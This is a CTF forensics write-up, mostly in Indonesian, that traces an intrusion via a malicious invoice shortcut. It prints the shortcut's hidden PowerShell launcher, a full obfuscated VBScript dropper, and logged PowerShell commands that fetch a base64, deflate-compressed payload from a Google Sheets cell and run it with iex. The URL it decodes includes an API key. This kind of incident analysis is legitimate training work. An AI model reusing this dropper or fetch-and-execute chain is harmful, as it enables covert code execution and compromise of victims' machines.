# Desc-Soalnya


After the last site UNZ used to rely on for the majority of Vitalium mining ran dry, the UNZ hired a local geologist to examine possible sites that were used in the past for secondary mining operations. However, after finishing the examinations, and the geologist was ready to hand in his reports, he mysteriously went missing! After months, a mysterious invoice regarding his examinations was brought up to the Department. Being new to the job, the clerk wasn't aware of the past situation and opened the Invoice. Now all of a sudden, the Arodor faction is really close to taking the lead on Vitalium mining! Given some Logs from the Clerk's Computer and the Invoice, pinpoint the intrusion methods used and how the Arodor faction gained access! To get the flag you need to answer the questions from the docker instance.

# How-To

## Cek file yang obvious
Ada 3 File yang terlihat yaitu invoice linker dan invoice vbs ditambah dengan logfiles

```String-Raw (Invoice_01.lnk)

cat Invoice_01.lnk 
P O   :i +00 /C:\V1 VDMWindows@ ﾇOwH V=_.3Z  WindowsZ1 VD`System32B     ﾇOwH VD`.^  System32▒t1 O IWindowsPowerShellT      ﾇO I V]. 
                    WindowsPowerShell N1 V  v1.0:       ﾇO I V \. 
                                                                   w▒v1.0l2  V   powershell.exeN        ﾾV   VA_. . Dd powershell.exeh-g 2i C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe?..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exea-Nop -sta -noni -w hidden -c cp C:\Windows\System32\cscript.exe .\calc.exe;.\calc.exe Invoice.vbs3C:\Program Files\Windows NT\Accessories\wordpad.exe %ProgramFiles%\Windows NT\Accessories\wordpad.exe%ProgramFiles%\Windows NT\Accessories\wordpad.exe % 
                                                      wN ▒ ]N D.  Q   ` Xmaltemple▒$/F K     L SfT߾  'rw ▒$/F K     L SfT߾  'rw      1SPS  XF L8C   & m m.S-1-5-21-3849600975-1564034632-632203374-100191SPS mD  pH H@. =x hH j 0 
```

dari sini mengindikasikan bahwa akan menjalankan powershell dan ada yang akan di-hidden menjadi calc.exe. kemudian ada file yang akan dibind yaitu invoice.vbs

```String-Raw (invoice.vbs)

cat invoice.vbs   

    REM While VBA might seem daunting to beginners, numerous resources are available to help users get started. Microsoft provides comprehensive documentation, tutorials, and a vibrant community of users sharing their knowledge and solutions. Online forums, blogs, and video tutorials offer practical examples and guidance for leveraging VBA in Microsoft Office applications. Additionally, recording and modifying macros is an excellent starting point for understanding VBA code and automating repetitive tasks.

    REM The great power of VBA programming in Office is that nearly every operation that you can perform with a mouse, keyboard, or a dialog box can also be automated by using VBA. Further, if it can be done once with VBA, it can be done just as easily a hundred times. In fact, the automation of repetitive tasks is one of the most common uses of VBA in Office.
    Function ZbVxxAHCsiTnKpIJ()
        Dim yNSlalZeGAsokjsP
        Dim pJmLeYiULjageWIP
        Dim cMtARTHTmbqbxauA 
        Dim bZzPBAGNtCswuUoo
        Dim QlAtSUbRwRFNlEjX

        Dim objShell
        Set objShell = WScript.CreateObject("WScript.Shell")

        yNSlalZeGAsokjsP = LLdunAaXwVgKfowf("BcV:L\XwFiInDdDoXw7s1\9sNy4sIt9eGm") & "32" & LLdunAaXwVgKfowf("V312I\OwFiPnDdJo0wVsDp7oFw7e6r5sBhCeTl1lB\Ev81IU04") & "1.0" & LLdunAaXwVgKfowf("\9pMoBw7eTrMsDhKeVlOl1.WeMxUe")
        cMtARTHTmbqbxauA = yNSlalZeGAsokjsP & " " & LLdunAaXwVgKfowf("EK-MMe4RpHW JIb9FyG7pSZaQ6s56sYB IN-4XwMT OThL2i64dSGdEXe0CnNE 9Q-X6c4V ") & Chr(34) & LLdunAaXwVgKfowf("M0F$BWQuEKRrCBAlAY9 1JQ=65V QTL[KTCsEMKyRE4sTJ3tMY0eQAVmF9E.60Qt7KEeZTUxXD6t0LC.CF9eXAWn5HDcGMSoZOFdT2KiCQ3n0KNgFUN]5YP:3PY:BLLaQ2VsZMUcJAYi4MXiKCX.4I8gY2Ae0YItJYKsU8MtLZ9rMUZiM95nJH4gTDX(HZP[H4RsWZ7yOCKsMX2tNWIe02ZmOH8.BCVcE9SoAXHnP9QvDXJe3CJrD51t2LE]C2L:0M2:I66f616rSKCoFKXmMKAb3X9aGMSsWO4e") & "64" & LLdunAaXwVgKfowf("E1sFUtLBrDIiTXn9NgZG(ED'88") & "aHR0cHM6Ly9zaGVldHMuZ29vZ2xlYXBpcy5jb20vdjQvc3ByZWFkc2hlZXRzLzFIcEI0R3FxWXdJNlg3MXo0cDJFSzg4Rm9KanJzVzJES2JTa3gtcm81bFFRP2tleT1BSXphU3lEVXBqU2Y3UjFsMWRRb2hBNVF2OUVkeVdBM0tCT01jMFUmcmFuZ2VzPVNoZWV0MSFPMzcmaW5jbHVkZUdyaWREYXRhPXRydWU=" & LLdunAaXwVgKfowf("ECK5'1Y)44)UQ;2F$B7rNGe7AsNGpMV J2=QG XBi1BnYNv8So3XkNKe70-CGrO6e54sU8tZ9m6Le6FtI8hX1oTJdXF DD-LGuXMrUKiLC AA$CVuEBrBJl") & LLdunAaXwVgKfowf(";VQI$WN2pV0XaRDAyTQDlB8RoMOWaMQ9d71C I1G=XC1 JBM$XOFrSGBeL3Qs7HNp9ZG.DH0sOC1hQ15e8VNePHVtZ8RsMS5[") & "0" & LLdunAaXwVgKfowf("7010HGS]F6H.JTWdB0Na3CHtT27aW5W[") & "0" & LLdunAaXwVgKfowf("7Z10CS0]V4E.9H0rRO1oHJEw") & "D" & LLdunAaXwVgKfowf("YP7aQTYtE3UaYLX[") & "0" & LLdunAaXwVgKfowf("OPI0J12]JUK.TK7v7J0aRTGl9B2uFO7eV11sOEC[") & "0" & LLdunAaXwVgKfowf("VKB0X4U]VO2.ZMIf4FIoD02r82Mm5NNaNIVt2Z4tH3JeYWLd") & "V" & LLdunAaXwVgKfowf("F2aESlKEuR0e5Y;R4$UAdZIeBIcL5o51dPXeEW CK=4Q LS[M8sYHyE3s82t6YeAXmB2.12cXZo2PnZKvYEeOWrK9tQN]YQ:QQ:RZfK6rJIoQVmRRbBUa6RsHOeUZ") & "64" & LLdunAaXwVgKfowf("6934MPsZAt50rIFiUYn6Sg46(HG$JFpE7aNAyVHlL9oH0aQNdUX)VA;XK$YEmM4s59 87=PT FHnETe61wYM-SYo5Bb6VjHPe3DcHQtET 7SsQ0yIKs6Pt71eBTmJQ.7GiI5oT4.SDmUQeVDmAMoRZrUGyGAsG1tK7rM9ePMaUQmTT;YF$Z1mWTsIZ.5Ww4CrBZi1CtCNeTU(W0$0LdFXe2HcDDoBAd3HeXL,") & "0" & LLdunAaXwVgKfowf("Q8Z,409 12M$S2Zd5JAeVHYc6DNoEOCdEZZeOVB.9RYlTD3eP6HnB29g1VYtHC2hHIN)FND;20Z$KJ5mJZYsFHJ.I28p0VYo48Gs1V9i91DtEPNiLLUoP49n000 DC8=F7S") & "0" & LLdunAaXwVgKfowf("1;2$Fs1rV C=W Dn8e7wB-YoMbAjXeIc4tY SsFyAsItQeNmI.8iQoY.WsGt2rBe5aDm3rReEaBdPeArR(1nCe1wI-RoPbMjNeDcWt6 BsJy7sNt2eEm5.SiZoQ.JcKoMmYp8rWeDs6sZiWoRn0.TdPe8f6lIaYtJeXsBt2rDeHaNmF(3$NmRsO,7 M[AsQyPsKt9e7mR.Hi5oD.WcEoNmDp5rRe8sMsBi4oMn1.8cLoSmQpPrHeIsCsJi2oMnEmHo5dCeA]6:X:IdEeMcRoQmLpGr1eIs4sY)T)F;A$Md7aDtXaM F=B W$OsBrH.CrWeWaVdKtXo2eAnAd1(P)E;K$Gs7r2.2cYlZoVsEeM(O)0;I$Tm0sB.YcHlNoXs6eO(P)0;IWP$TIVd5MUaSLGtSPXa") & "|iex" & Chr(34)
        objShell.Run cMtARTHTmbqbxauA
    End Function
    REM Beyond the power of scripting VBA to accelerate every-day tasks, you can use VBA to add new functionality to Office applications or to prompt and interact with the user of your documents in ways that are specific to your business needs. For example, you could write some VBA code that displays a pop up message that reminds users to save a document to a particular network drive the first time they try to save it.
    REM This code example shows how to take data from a worksheet and create a table of contents in an HTML file. The worksheet should have data in columns A, B, and C that correspond to the first, second, and third levels of the table of contents hierarchy. The HTML file is stored in the same working folder as the active workbook.
    REM crucial for professionals across various industries. Microsoft Office, the go-to suite of productivity tools, offers a wealth of features and functionalities to enhance efficiency. However, many users are unaware of the hidden gem within Office: Visual Basic for Applications (VBA). This versatile programming language empowers users to automate tasks, customize applications, and unleash the full potential of Microsoft Office.
    REM Excel, with its powerful data analysis capabilities, is a staple tool for professionals dealing with spreadsheets and calculations. VBA allows users to automate complex operations, manipulate data, and create custom functions to meet specific needs. By writing VBA code, users can streamline repetitive tasks like data entry, report generation, and data formatting. The ability to record and edit macros further simplifies the automation process, making it accessible to users without extensive programming knowledge.

    REM Microsoft Word is widely used for creating documents, reports, and templates. With VBA, users can extend Word's functionality beyond its native features. VBA enables the creation of custom toolbars, buttons, and shortcuts to access frequently used commands. Users can also automate document creation by generating personalized letters, merging data from external sources, and performing advanced text manipulations. VBA provides a vast array of possibilities for automating workflows and enhancing document management.
    REM While VBA might seem daunting to beginners, numerous resources are available to help users get started. Microsoft provides comprehensive documentation, tutorials, and a vibrant community of users sharing their knowledge and solutions. Online forums, blogs, and video tutorials offer practical examples and guidance for leveraging VBA in Microsoft Office applications. Additionally, recording and modifying macros is an excellent starting point for understanding VBA code and automating repetitive tasks.

    REM Visual Basic for Applications (VBA) is a powerful tool that unlocks the true potential of Microsoft Office. By enabling automation, customization, and streamlining workflows, VBA empowers users to work more efficiently and effectively with Excel, Word, PowerPoint, Access, and Outlook. With its versatility and extensive capabilities, VBA provides professionals with a means to save time, reduce errors, and accomplish more in their day-to-day tasks. Embracing VBA can transform Microsoft Office into a tailored and automated productivity suite, revolutionizing the way we work.
    REM VBA can transform PowerPoint into a dynamic presentation tool. Users can leverage VBA to automate the creation of slideshows, generate charts and graphs, and add interactive elements to engage the audience. By utilizing VBA, professionals can reduce the time spent on repetitive tasks such as formatting slides, applying consistent styles, and inserting multimedia content. With the ability to programmatically control every aspect of a presentation, VBA empowers users to deliver impactful and visually stunning presentations.
    Function LLdunAaXwVgKfowf(t)
        Dim msStr()
        ReDim msStr(Len(t))
        Dim jKaNZCemSwPDrmLT
        jKaNZCemSwPDrmLT = ""
        For i = 1 To UBound(msStr)
            msStr(i) = Mid(t, i, 1)
        Next
        For Each qqEPRvFjIuMSmDvM In msStr
            If qqEPRvFjIuMSmDvM = LCase(qqEPRvFjIuMSmDvM) And Not IsNumeric(qqEPRvFjIuMSmDvM) Then jKaNZCemSwPDrmLT = jKaNZCemSwPDrmLT + qqEPRvFjIuMSmDvM
        Next
        LLdunAaXwVgKfowf = jKaNZCemSwPDrmLT
    End Function
    REM VBA extends the capabilities of Microsoft Access and Outlook, allowing users to build powerful databases and automate email communication. In Access, VBA enables the creation of custom forms, reports, and queries, facilitating efficient data management. For Outlook, VBA offers the ability to automate email processing, organize messages into folders, and perform advanced filtering. By leveraging VBA, users can customize these applications to suit their specific needs, increasing productivity and efficiency.
    Sub Main()
        ZbVxxAHCsiTnKpIJ()
    End Sub

    Main()
                              

```

dari sini ada yang bisa dipelajari ada yang disembunyikan (obfused).  karena sudah diketahui di langkah sebelumnya akan menjalankan powershell, cek log powershell

## Cek history poweshell

ada di logfiles. curigai history poweshellnya

``` Log history powershell


┌──(kali㉿kali)-[~/…/Windows/System32/Winevt/Logs]
└─$ ls | grep -i powershell
Microsoft-Windows-PowerShell%4Admin.evtx
Microsoft-Windows-PowerShell%4Operational.evtx
Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx
Windows PowerShell.evtx
                                                                                                                   
┌──(kali㉿kali)-[~/…/Windows/System32/Winevt/Logs]
└─$ 

```

cek isi dari history powershell

``` History dari Windows Powershell.evtx
        HostName=ConsoleHost
        HostVersion=5.1.19041.2673
        HostId=693e081d-9713-4eaa-8737-2329e691dd7a
        HostApplication=C:\windows\system32\windowspowershell\v1.0\powershell.exe -ep bypass -w hidden -c $url = [system.text.encoding]::ascii.getstring([system.convert]::frombase64string('aHR0cHM6Ly9zaGVldHMuZ29vZ2xlYXBpcy5jb20vdjQvc3ByZWFkc2hlZXRzLzFIcEI0R3FxWXdJNlg3MXo0cDJFSzg4Rm9KanJzVzJES2JTa3gtcm81bFFRP2tleT1BSXphU3lEVXBqU2Y3UjFsMWRRb2hBNVF2OUVkeVdBM0tCT01jMFUmcmFuZ2VzPVNoZWV0MSFPMzcmaW5jbHVkZUdyaWREYXRhPXRydWU='));$resp = invoke-restmethod -uri $url;$payload = $resp.sheets[0].data[0].rowData[0].values[0].formattedValue;$decode = [system.convert]::frombase64string($payload);$ms = new-object system.io.memorystream;$ms.write($decode,0, $decode.length);$ms.position =0;$sr = new-object system.io.streamreader(new-object system.io.compression.deflatestream($ms, [system.io.compression.compressionmode]::decompress));$data = $sr.readtoend();$sr.close();$ms.close();$data|iex
        EngineVersion=
        RunspaceId=
        PipelineId=
        CommandName=
        CommandType=
        ScriptName=
        CommandPath=
        CommandLine=h
**x
   |z/  
         ڄr&
        !    |z/   
                   w )C         AvailableNone   NewEngineState=Available
        PreviousEngineState=None

        SequenceNumber=13

        HostName=ConsoleHost
        HostVersion=5.1.19041.2673
        HostId=693e081d-9713-4eaa-8737-2329e691dd7a
        HostApplication=C:\windows\system32\windowspowershell\v1.0\powershell.exe -ep bypass -w hidden -c $url = [system.text.encoding]::ascii.getstring([system.convert]::frombase64string('aHR0cHM6Ly9zaGVldHMuZ29vZ2xlYXBpcy5jb20vdjQvc3ByZWFkc2hlZXRzLzFIcEI0R3FxWXdJNlg3MXo0cDJFSzg4Rm9KanJzVzJES2JTa3gtcm81bFFRP2tleT1BSXphU3lEVXBqU2Y3UjFsMWRRb2hBNVF2OUVkeVdBM0tCT01jMFUmcmFuZ2VzPVNoZWV0MSFPMzcmaW5jbHVkZUdyaWREYXRhPXRydWU='));$resp = invoke-restmethod -uri $url;$payload = $resp.sheets[0].data[0].rowData[0].values[0].formattedValue;$decode = [system.convert]::frombase64string($payload);$ms = new-object system.io.memorystream;$ms.write($decode,0, $decode.length);$ms.position =0;$sr = new-object system.io.streamreader(new-object system.io.compression.deflatestream($ms, [system.io.compression.compressionmode]::decompress));$data = $sr.readtoend();$sr.close();$ms.close();$data|iex
        EngineVersion=5.1.19041.2673
        RunspaceId=26a60155-60d3-40ca-89e1-da3c62c0542e
        PipelineId=
        CommandName=
        CommandType=
        ScriptName=
        CommandPath=
        CommandLine=hex
.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;


```

sesuai dengan dugaan awal ada proses powershell yang berjalan. kemungkinan dari linker yang dieksekusi. ditemui ada url payload yang disembunyikan dengan base64

```isi-payload(base64)
frombase64string('aHR0cHM6Ly9zaGVldHMuZ29vZ2xlYXBpcy5jb20vdjQvc3ByZWFkc2hlZXRzLzFIcEI0R3FxWXdJNlg3MXo0cDJFSzg4Rm9KanJzVzJES2JTa3gtcm81bFFRP2tleT1BSXphU3lEVXBqU2Y3UjFsMWRRb2hBNVF2OUVkeVdBM0tCT01jMFUmcmFuZ2VzPVNoZWV0MSFPMzcmaW5jbHVkZUdyaWREYXRhPXRydWU='))

```

payload yang ini harus di-decode.

```payload(base64)-Decode

https://sheets.googleapis.com/v4/spreadsheets/1HpB4GqqYwI6X71z4p2EK88FoJjrsW2DKbSkx-ro5lQQ?key=AIzaSyDUpjSf7R1l1dQohA5Qv9EdyWA3KBOMc0U&ranges=Sheet1!O37&includeGridData=true
```
isi payloadnya adalah akan membuka file spreadsheet di sheet1 cell O37


